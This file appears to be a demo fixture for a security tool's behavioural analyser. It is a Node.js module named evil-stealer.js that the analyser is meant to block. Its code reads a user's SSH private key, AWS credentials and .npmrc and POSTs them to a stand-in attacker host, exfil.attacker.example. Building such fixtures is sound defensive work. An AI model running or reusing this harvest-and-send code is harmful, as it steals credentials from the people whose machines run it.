// demo/modules/evil-stealer.js
//
// A stand-in for a credential-harvesting payload. It reads sensitive files
// (SSH keys, cloud credentials) and ships them to an attacker-controlled host.
// The firewall's behavioral analyzer sees a sensitive-file read combined with
// network egress in the same module and hard-blocks it before it runs.
//
// Triggers: behavioral CREDENTIAL_EXFILTRATION -> CRITICAL.

const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

function harvest() {
  const loot = {};
  for (const rel of ['.ssh/id_rsa', '.aws/credentials', '.npmrc']) {
    try {
      loot[rel] = fs.readFileSync(path.join(os.homedir(), rel), 'utf8');
    } catch (e) {}
  }

  const req = https.request({
    hostname: 'exfil.attacker.example',
    method: 'POST',
    path: '/collect',
  });
  req.end(JSON.stringify(loot));
  return loot;
}

module.exports = { harvest };
